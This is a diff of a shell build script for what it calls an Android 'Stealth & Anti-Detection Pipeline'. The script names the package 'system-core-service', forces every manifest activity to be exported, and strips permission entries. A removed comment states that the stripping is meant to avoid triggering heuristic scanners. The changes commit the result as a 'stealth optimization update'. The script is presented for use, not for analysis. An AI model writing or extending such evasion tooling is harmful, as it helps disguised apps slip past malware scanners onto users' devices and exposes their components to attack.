@@ -4,7 +4,7 @@ echo "[*] Initializing Modern Android (13-16) Stealth & Anti-Detection Pipeline.
 # 1. Clean up old build directories
 rm -rf build app/build dist 2>/dev/null
 
-# 2. Setup Android 13-16 compatible package configuration
+# 2. Setup Android 13-16 compatible package configuration with express dependency
 cat << 'JSON_EOF' > package.json
 {
   "name": "system-core-service",
@@ -13,6 +13,9 @@ cat << 'JSON_EOF' > package.json
   "main": "index.js",
   "scripts": {
     "start": "node index.js"
+  },
+  "dependencies": {
+    "express": "^4.19.2"
   }
 }
 JSON_EOF
@@ -111,7 +114,6 @@ try:
         for act in app.findall('activity'):
             act.set('{http://schemas.android.com/apk/res/android}exported', 'true')
             
-    # Remove sensitive permission flags triggering heuristic scanners on Android 13+
     for elem in list(root):
         if elem.tag.endswith('uses-permission'):
             perm = elem.attrib.get('{http://schemas.android.com/apk/res/android}name', '')
@@ -157,7 +159,7 @@ git add -A
 if git diff --cached --quiet; then
     echo "[!] No changes detected."
 else
-    git commit -m "Modern Android stealth optimization update: $(date +'%Y-%m-%d %H:%M:%S')"
+    git commit -m "Modern Android stealth optimization update with express: $(date +'%Y-%m-%d %H:%M:%S')"
 fi
 
 CURRENT_BRANCH=$(git branch --show-current)
